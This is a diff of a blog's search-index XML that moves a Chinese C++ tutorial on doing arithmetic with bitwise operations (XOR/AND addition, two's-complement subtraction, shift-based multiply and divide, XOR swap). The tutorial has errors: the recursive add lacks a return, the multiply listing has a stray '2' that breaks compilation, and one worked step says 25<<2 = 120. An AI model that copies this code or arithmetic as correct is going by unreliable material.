@@ -1,6 +1,176 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>位运算实现加减乘除</title>
+    <url>/add-subtract-multiply-divide/</url>
+    <content><![CDATA[<p>计算机内部实现数据的加减乘除运算是通过对二进制位运算来实现的，基本运算&quot; + - × ÷ &quot; 均可转换为位运算。</p>
+<span id="more"></span>
+<p>在介绍加减乘除运算前，我们需要了解一些基本的位运算。</p>
+<p>与 &amp;<br />
+1 and 1 = 1<br />
+1 and 0 = 0<br />
+0 and 1 = 0<br />
+0 and 0 = 0</p>
+<p>或 |<br />
+1 or 1 = 1<br />
+1 or 0 = 1<br />
+0 or 1 = 1<br />
+0 or 0 = 0</p>
+<p>异或 ^<br />
+1 xor 1 = 0<br />
+1 xor 0 = 1<br />
+0 xor 1 = 1<br />
+0 xor 0 = 0</p>
+<h2 id="加法运算"><a class="markdownIt-Anchor" href="#加法运算"></a> 加法运算</h2>
+<p>假如右两个32位的int整数：</p>
+<blockquote>
+<p>a=10: 00000000000000000000000000001010<br />
+b=13: 00000000000000000000000000001101</p>
+</blockquote>
+<p>将这两个数10和13相加：<br />
+a=01010 (10)<br />
+b=01101 (13)<br />
+c=10111 (23)</p>
+<p>把上面的二进制分割为每一位后a+b=c</p>
+<table>
+<thead>
+<tr>
+<th>a</th>
+<th>b</th>
+<th>xor ^</th>
+<th style="text-align:left">and &amp;</th>
+<th>c</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>1</td>
+<td>1</td>
+<td style="text-align:left">0</td>
+<td>1</td>
+</tr>
+<tr>
+<td>1</td>
+<td>0</td>
+<td>1</td>
+<td style="text-align:left">0</td>
+<td>1</td>
+</tr>
+<tr>
+<td>0</td>
+<td>1</td>
+<td>1</td>
+<td style="text-align:left">0</td>
+<td>1</td>
+</tr>
+<tr>
+<td>1</td>
+<td>1</td>
+<td>0</td>
+<td style="text-align:left">1</td>
+<td>0</td>
+</tr>
+<tr>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td style="text-align:left">0</td>
+<td>1</td>
+</tr>
+</tbody>
+</table>
+<p>我们发现 位异或^ 单纯的将两个数相加，不过并没有考虑 <strong>进位</strong> )，但是 与运算&amp; 能够表示两个二进制相加是否发生了进位（如上表所示）。</p>
+<p>也就是说，利用 xor 将两个数相加，and 判断是否有进位，如果有，那个满2进1位 carry&lt;&lt;=1</p>
+<blockquote>
+<p>sum = a^b<br />
+carry = a&amp;b<br />
+carry &lt;&lt;= 1</p>
+</blockquote>
+<p>假如这样计算会发生什么?</p>
+<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">add</span>(a,b)<br>a=<span class="hljs-number">01010</span><br>b=<span class="hljs-number">01101</span><br><br>sum=a^b =&gt; <span class="hljs-number">00111</span> <span class="hljs-comment">// 求和</span><br>carry=a&amp;b =&gt; <span class="hljs-number">01000</span> <span class="hljs-comment">// 求进位: 1&amp;1</span><br>carry=carry&lt;&lt;<span class="hljs-number">1</span> =&gt; <span class="hljs-number">10000</span> <span class="hljs-comment">//满2进1</span><br><br>如果carry进位!=<span class="hljs-number">0</span>,否则就结束<br>假设<br>a=sum=  <span class="hljs-number">00111</span><br>b=carry=<span class="hljs-number">10000</span><br>重复之前的步骤...此时新的a=sum,b=carry<br>sum=a^b =&gt; <span class="hljs-number">10111</span><br>carry=a&amp;b =&gt; <span class="hljs-number">00000</span><br>carry=carry&lt;&lt;<span class="hljs-number">1</span> =&gt; <span class="hljs-number">00000</span><br><br>此时sum=<span class="hljs-number">10111</span> 且 carry=<span class="hljs-number">0</span> <br>结果正确！<br></code></pre></div></td></tr></table></figure>
+<p>sum=a^b 表明对a和b求和（不考虑进位），而 (a&amp;b)&lt;&lt;1 表明求a和b中哪个位发生了进位，并且将该位置于最高位(通过左移一位)</p>
+<p>因此C++代码如下:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">// 迭代1，按照上面的思路来写</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> carry=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        sum=a^b;<br>        carry=(a&amp;b)&lt;&lt;<span class="hljs-number">1</span>;<br>        a=sum;<br>        b=carry;<br>    &#125; <span class="hljs-keyword">while</span> (carry); <span class="hljs-comment">//判断是否有进位。如无，则表示没有可以加的值</span><br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br><span class="hljs-comment">// 迭代2</span><br><span class="hljs-comment">// 还可以修改为以下代码</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> sum=a; <br>    <span class="hljs-keyword">int</span> carry=b;<br>    <span class="hljs-keyword">while</span> (carry)&#123;<br>        <span class="hljs-keyword">int</span> temp=sum;<br>        sum=temp^carry; <span class="hljs-comment">//a+b</span><br>        carry=(temp&amp;carry)&lt;&lt;<span class="hljs-number">1</span>; <span class="hljs-comment">//进1位</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br><span class="hljs-comment">//递归</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(b==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> a;<br>    <span class="hljs-keyword">int</span> carry=(a&amp;b)&lt;&lt;<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> sum=a^b;<br>    <span class="hljs-comment">// 将a+b转化为sum+carry</span><br>    <span class="hljs-built_in">add</span>(sum,carry);<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<h2 id="减法运算"><a class="markdownIt-Anchor" href="#减法运算"></a> 减法运算</h2>
+<p>由于计算机只会进行加法运算，那么减法就可以转变为加法运算，这涉及到计算机的原码反码和补码知识了。这里简单提下</p>
+<ul>
+<li>正数的 <strong>原码=反码=补码</strong></li>
+<li>负数的 原码=正数的原码且最高位置为1。<br />
+如32位-3原码可表示为 10000000000000000000000000000011</li>
+<li>负数的反码为其原码的最高位1不变，其余位取反(~)<br />
+如32位-3反码可表示为 11111111111111111111111111111100</li>
+<li>负数的补码为其反码+1<br />
+如32位-3补码可表示为 11111111111111111111111111111101</li>
+</ul>
+<p><strong>目前补码普遍是计算机内部数值的表示方式，它很好的解决了 +0 和 -0的问题</strong></p>
+<p>因此减法运算就变得十分简单的<br />
+代码如下</p>
+<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">// a - b = a + (-b) = a + (~b + 1 )</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">subtract</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> negative=<span class="hljs-built_in">add</span>(~b,<span class="hljs-number">1</span>); <span class="hljs-comment">// ~b + 1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">add</span>(a,negative); <br>&#125;<br></code></pre></div></td></tr></table></figure>
+<p>负数和正数转换(设x&gt;0)：</p>
+<blockquote>
+<p>-x=(~x+1)  如 -10=(~10+1)<br />
+x=~(-x-1)  如 10=~(-10-1)<br />
+x=~(-x)+1 如 10=~(-10)+1</p>
+</blockquote>
+<h2 id="乘法运算"><a class="markdownIt-Anchor" href="#乘法运算"></a> 乘法运算</h2>
+<p>其实乘法也就是多个加法的累积求和，在我们小学时，25×5应该是这样计算的</p>
+<figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">   <span class="hljs-number"> 2 </span>5<br> × <span class="hljs-number"> 0 </span>5<br> ————————<br> <span class="hljs-number"> 1 </span>2 5<br>+<span class="hljs-number"> 0 </span>0<br> ————————<br> <span class="hljs-number"> 1 </span>2 5<br></code></pre></div></td></tr></table></figure>
+<p>二进制也可以这样计算，不过就是满2进1。这里还是以25×5=125为例</p>
+<figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">      <span class="hljs-number"> 0 </span>1<span class="hljs-number"> 1 </span>0<span class="hljs-number"> 0 </span>1   = 25<br>     ×      <span class="hljs-number"> 1 </span>0<span class="hljs-number"> 1 </span>  = 5<br>————————————————————<br>      <span class="hljs-number"> 0 </span>1<span class="hljs-number"> 1 </span>0<span class="hljs-number"> 0 </span>1   = 25<br>+   <span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0     = 0<br>+ <span class="hljs-number"> 0 </span>1<span class="hljs-number"> 1 </span>0<span class="hljs-number"> 0 </span>1       = 25&lt;&lt;2 = 25*2^2=120<br>——————————————————— <br>  <span class="hljs-number"> 0 </span>1<span class="hljs-number"> 1 </span>1<span class="hljs-number"> 1 </span>1<span class="hljs-number"> 0 </span>1   =<span class="hljs-number"> 125 </span>= 25+120<br></code></pre></div></td></tr></table></figure>
+<p>将乘法分解为加法即可实现位运算，大致思路如下，<br />
+存在一个函数 <code>int multiply(int a,int b);</code><br />
+1.若b&lt;0，则对b求负化为<strong>正数</strong>，同时设置一个标识neagtive_mask记录该b是负数<br />
+2.对除数b不断右移b&gt;&gt;=1并且取得b最低位的值(0或1)，直到b=0<br />
+3.若为1，则add操作得sum<br />
+4.a不断左移1位 a&lt;&lt;=1<br />
+5.结尾判断neagtive_mask来设置sum的正负</p>
+<p>注意，除数如果为负数，假设为 11111111111111111111111111111011 (-5)，那么其右移得不到b=0，至于被除数可以小于0<br />
+具体代码如下</p>
+<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">multiply</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-comment">// 判断正负</span><br>    <span class="hljs-keyword">bool</span> neagtive_mask=(b&lt;<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(b&lt;<span class="hljs-number">0</span>)&#123;<span class="hljs-number">2</span><br>        b=~(b<span class="hljs-number">-1</span>); <span class="hljs-comment">// 化为正数: -x=(~x+1) &lt;-&gt; x=-(-x-1) (x&gt;0) </span><br>    &#125;<br>    <span class="hljs-keyword">int</span> sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (b) <br>    &#123;<br>        <span class="hljs-keyword">if</span>(b&amp;<span class="hljs-number">0x1</span>)&#123; <span class="hljs-comment">//取最低位，最低位为1，求和</span><br>            sum=<span class="hljs-built_in">add</span>(sum,a); <span class="hljs-comment">//累加</span><br>        &#125;<br>        b&gt;&gt;=<span class="hljs-number">1</span>; <span class="hljs-comment">// 除数右移将最低位溢出</span><br>        a&lt;&lt;=<span class="hljs-number">1</span>; <span class="hljs-comment">// 被除数左移</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(neagtive_mask)&#123;<br>        sum=~(sum<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<h2 id="除法运算"><a class="markdownIt-Anchor" href="#除法运算"></a> 除法运算</h2>
+<p>除法就相对来说复杂了，不过除法类似减法，不断地减去除数得到商，最后剩下余数<br />
+这里还是以小学数学除法为例子 37÷3=12…1</p>
+<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">     <span class="hljs-number">12</span> <br>  -----<br><span class="hljs-number">3</span> | <span class="hljs-number">37</span><br>  - <span class="hljs-number">3</span><br>   ----	<br>      <span class="hljs-number">7</span><br>    - <span class="hljs-number">6</span>   <br>    ---<br>      <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>
+<p>其中这操作还可以转换为</p>
+<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">步骤<span class="hljs-number">1</span><br>     <span class="hljs-number">1</span><br>   -----<br><span class="hljs-number">30</span> | <span class="hljs-number">37</span>    <br>   - <span class="hljs-number">30</span><br>    ----	<br>	  <span class="hljs-number">7</span>  <br>步骤<span class="hljs-number">2</span><br>    <span class="hljs-number">2</span><br>   ----<br> <span class="hljs-number">3</span>| <span class="hljs-number">7</span>   <br>   <span class="hljs-number">-6</span><br>    ---	<br>    <span class="hljs-number">1</span><br>  <br>商: <span class="hljs-number">1</span>*<span class="hljs-number">10</span>^<span class="hljs-number">1</span> + <span class="hljs-number">2</span>*<span class="hljs-number">10</span>^<span class="hljs-number">0</span> = <span class="hljs-number">10</span>+<span class="hljs-number">2</span>=<span class="hljs-number">12</span><br>最后余下<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>
+<p>发现了什么吗？</p>
+<p>现在我们把上面十进制换成二进制</p>
+<blockquote>
+<p>37: 100101<br />
+3:       0011<br />
+7:       1101</p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">步骤<span class="hljs-number">1</span><br>         <span class="hljs-number">1</span><br>      --------<br> <span class="hljs-number">11000</span>|	<span class="hljs-number">100101</span> -&gt;a=<span class="hljs-number">37</span>  <br>       - <span class="hljs-number">11000</span> <br>    	-------	<br>	      <span class="hljs-number">1101</span> -&gt;<span class="hljs-number">7</span><br>步骤<span class="hljs-number">2</span><br>       <span class="hljs-number">1</span><br>    ------<br><span class="hljs-number">1100</span>| <span class="hljs-number">1101</span>  -&gt;a=<span class="hljs-number">7</span><br>   -  <span class="hljs-number">1100</span> <br>    ------	<br>        <span class="hljs-number">1</span><br>步骤<span class="hljs-number">3</span><br>         <span class="hljs-number">0</span><br>    ------<br> <span class="hljs-number">110</span>|   <span class="hljs-number">1</span> <br>   -    <span class="hljs-number">0</span> <br>    ------	<br>        <span class="hljs-number">1</span><br>商: <span class="hljs-number">1</span>*<span class="hljs-number">2</span>^<span class="hljs-number">3</span> + <span class="hljs-number">1</span>*<span class="hljs-number">2</span>^<span class="hljs-number">2</span> + <span class="hljs-number">0</span> <br>  = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">3</span> + <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">2</span> + <span class="hljs-number">0</span><br>  = <span class="hljs-number">8</span>+<span class="hljs-number">4</span>+<span class="hljs-number">0</span>=<span class="hljs-number">12</span><br>最后余下<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>
+<p>在上面例子中，除数3<strong>左移3位</strong>变为 11000，接着除数3<strong>左移2位</strong>变为 1100，最后<strong>左移1位</strong>变为 110。<br />
+此时发现 <strong>被除数1</strong> 小于 <strong>除数110</strong>，因此商为0（C++语言中除法运算导致返回一个<strong>整数</strong>）。<br />
+因此如果发现被除数小于除数，那么直接返回0即可。</p>
+<p>于是要先找到除数应该左移的位数，且使得除数是&lt;=除数<br />
+然后利用减法 :a=subtract(a,b&lt;&lt;nMove)</p>
+<p>利用加法 :当前累加值r=add(前一个值累加值r,1&lt;&lt;nMove)</p>
+<p>代码如下</p>
+<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">divide</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> nMove=<span class="hljs-number">0</span>; <br>    <span class="hljs-keyword">bool</span> negative_mask=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">if</span>(a&lt;<span class="hljs-number">0</span>)&#123;<br>        a=~(a<span class="hljs-number">-1</span>); <span class="hljs-comment">// 化正</span><br>        negative_mask=<span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(b&lt;<span class="hljs-number">0</span>)&#123;<br>        b=~(b<span class="hljs-number">-1</span>); <span class="hljs-comment">// 化正</span><br>        <span class="hljs-comment">// 同号得正，异号的负</span><br>        negative_mask=negative_mask==<span class="hljs-literal">false</span>?<span class="hljs-literal">true</span>:<span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(a&lt;b)&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br>    <span class="hljs-comment">// 找到除数应该左移的位数，且使得除数是&lt;=除数</span><br>    <span class="hljs-keyword">for</span> ( nMove = <span class="hljs-number">0</span>; nMove&lt;<span class="hljs-number">32</span>;nMove++)&#123;<br>        <span class="hljs-keyword">if</span>((b&lt;&lt;nMove)&gt;=a)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">int</span> r=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = nMove; i &gt;=<span class="hljs-number">0</span>; i--)&#123;<br>        <span class="hljs-keyword">int</span> t=b&lt;&lt;i;<br>        <span class="hljs-keyword">if</span>(a&lt;t) <span class="hljs-comment">// 被除数小于除数</span><br>            <span class="hljs-keyword">continue</span>;<br>        a=<span class="hljs-built_in">subtract</span>(a,t);<br>        r=<span class="hljs-built_in">add</span>(r,<span class="hljs-number">1</span>&lt;&lt;i);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(negative_mask)&#123;<br>        r=~(r<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> r;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<h2 id="输出二进制"><a class="markdownIt-Anchor" href="#输出二进制"></a> 输出二进制</h2>
+<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printBinary</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>&#123;<br>	<span class="hljs-keyword">char</span> strBinary[<span class="hljs-number">33</span>]&#123; <span class="hljs-number">0</span> &#125;;<br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> bitmask = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>;<br>	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>	&#123;<br>		<span class="hljs-keyword">char</span> k = ((number &amp; bitmask)&gt;&gt;<span class="hljs-number">31</span>)?<span class="hljs-string">&#x27;1&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>;<br>		strBinary[i] = k;<br>		number &lt;&lt;= <span class="hljs-number">1</span>;<br>	&#125;<br>	cout &lt;&lt; strBinary &lt;&lt; endl;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<h2 id="简单数据交换"><a class="markdownIt-Anchor" href="#简单数据交换"></a> 简单数据交换</h2>
+<p>利用xor位异或来实现值交换</p>
+<p>原理:</p>
+<blockquote>
+<p>a ^ a = 0<br />
+a ^ 0 = a<br />
+0 ^ a = a</p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> a=<span class="hljs-number">10</span>,b=<span class="hljs-number">20</span>;<br>a=a^b; <span class="hljs-comment">// a=a^b;</span><br>b=a^b; <span class="hljs-comment">// b=(a^b)^b=a^(b^b)=a^0=a;</span><br>a=a^b; <span class="hljs-comment">// a=(a^b)^a=(a^a)^b=0^b=b;</span><br></code></pre></div></td></tr></table></figure>
+<p>bye~</p>
+]]></content>
+      <categories>
+        <category>Programming</category>
+      </categories>
+      <tags>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Archlinux从安装到基本配置</title>
     <url>/archlinux-configure/</url>
     <content><![CDATA[<p>这里介绍从安装archlinux系统到基本配置过程，基本搜集了网上和官方wiki整理而来的，把错误最低化。当然，本文也是作为我的一份手册吧…</p>
@@ -234,176 +404,6 @@ dencies yourself.</p>
       <tags>
         <tag>Linux</tag>
         <tag>Archlinux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>位运算实现加减乘除</title>
-    <url>/add-subtract-multiply-divide/</url>
-    <content><![CDATA[<p>计算机内部实现数据的加减乘除运算是通过对二进制位运算来实现的，基本运算&quot; + - × ÷ &quot; 均可转换为位运算。</p>
-<span id="more"></span>
-<p>在介绍加减乘除运算前，我们需要了解一些基本的位运算。</p>
-<p>与 &amp;<br />
-1 and 1 = 1<br />
-1 and 0 = 0<br />
-0 and 1 = 0<br />
-0 and 0 = 0</p>
-<p>或 |<br />
-1 or 1 = 1<br />
-1 or 0 = 1<br />
-0 or 1 = 1<br />
-0 or 0 = 0</p>
-<p>异或 ^<br />
-1 xor 1 = 0<br />
-1 xor 0 = 1<br />
-0 xor 1 = 1<br />
-0 xor 0 = 0</p>
-<h2 id="加法运算"><a class="markdownIt-Anchor" href="#加法运算"></a> 加法运算</h2>
-<p>假如右两个32位的int整数：</p>
-<blockquote>
-<p>a=10: 00000000000000000000000000001010<br />
-b=13: 00000000000000000000000000001101</p>
-</blockquote>
-<p>将这两个数10和13相加：<br />
-a=01010 (10)<br />
-b=01101 (13)<br />
-c=10111 (23)</p>
-<p>把上面的二进制分割为每一位后a+b=c</p>
-<table>
-<thead>
-<tr>
-<th>a</th>
-<th>b</th>
-<th>xor ^</th>
-<th style="text-align:left">and &amp;</th>
-<th>c</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>0</td>
-<td>1</td>
-<td>1</td>
-<td style="text-align:left">0</td>
-<td>1</td>
-</tr>
-<tr>
-<td>1</td>
-<td>0</td>
-<td>1</td>
-<td style="text-align:left">0</td>
-<td>1</td>
-</tr>
-<tr>
-<td>0</td>
-<td>1</td>
-<td>1</td>
-<td style="text-align:left">0</td>
-<td>1</td>
-</tr>
-<tr>
-<td>1</td>
-<td>1</td>
-<td>0</td>
-<td style="text-align:left">1</td>
-<td>0</td>
-</tr>
-<tr>
-<td>0</td>
-<td>0</td>
-<td>0</td>
-<td style="text-align:left">0</td>
-<td>1</td>
-</tr>
-</tbody>
-</table>
-<p>我们发现 位异或^ 单纯的将两个数相加，不过并没有考虑 <strong>进位</strong> )，但是 与运算&amp; 能够表示两个二进制相加是否发生了进位（如上表所示）。</p>
-<p>也就是说，利用 xor 将两个数相加，and 判断是否有进位，如果有，那个满2进1位 carry&lt;&lt;=1</p>
-<blockquote>
-<p>sum = a^b<br />
-carry = a&amp;b<br />
-carry &lt;&lt;= 1</p>
-</blockquote>
-<p>假如这样计算会发生什么?</p>
-<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">add</span>(a,b)<br>a=<span class="hljs-number">01010</span><br>b=<span class="hljs-number">01101</span><br><br>sum=a^b =&gt; <span class="hljs-number">00111</span> <span class="hljs-comment">// 求和</span><br>carry=a&amp;b =&gt; <span class="hljs-number">01000</span> <span class="hljs-comment">// 求进位: 1&amp;1</span><br>carry=carry&lt;&lt;<span class="hljs-number">1</span> =&gt; <span class="hljs-number">10000</span> <span class="hljs-comment">//满2进1</span><br><br>如果carry进位!=<span class="hljs-number">0</span>,否则就结束<br>假设<br>a=sum=  <span class="hljs-number">00111</span><br>b=carry=<span class="hljs-number">10000</span><br>重复之前的步骤...此时新的a=sum,b=carry<br>sum=a^b =&gt; <span class="hljs-number">10111</span><br>carry=a&amp;b =&gt; <span class="hljs-number">00000</span><br>carry=carry&lt;&lt;<span class="hljs-number">1</span> =&gt; <span class="hljs-number">00000</span><br><br>此时sum=<span class="hljs-number">10111</span> 且 carry=<span class="hljs-number">0</span> 